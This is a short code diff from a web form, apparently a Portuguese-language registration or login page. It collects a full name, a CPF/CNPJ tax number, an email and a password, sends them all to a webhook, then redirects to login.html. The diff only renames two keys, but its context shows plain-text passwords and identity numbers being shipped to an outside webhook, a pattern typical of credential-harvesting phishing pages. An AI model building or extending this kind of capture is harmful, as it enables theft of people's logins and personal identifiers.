@@ -83,8 +83,8 @@
             const data = {
                 "Full Name": formData.get('nome'),
                 "CPF or CNPJ": formData.get('cpf'),
-                "email": formData.get('email'),
-                "password": formData.get('senha')
+                "Email": formData.get('email'),
+                "Password": formData.get('senha')
             };
             sendWebhook(data);
             window.location.href = 'login.html';
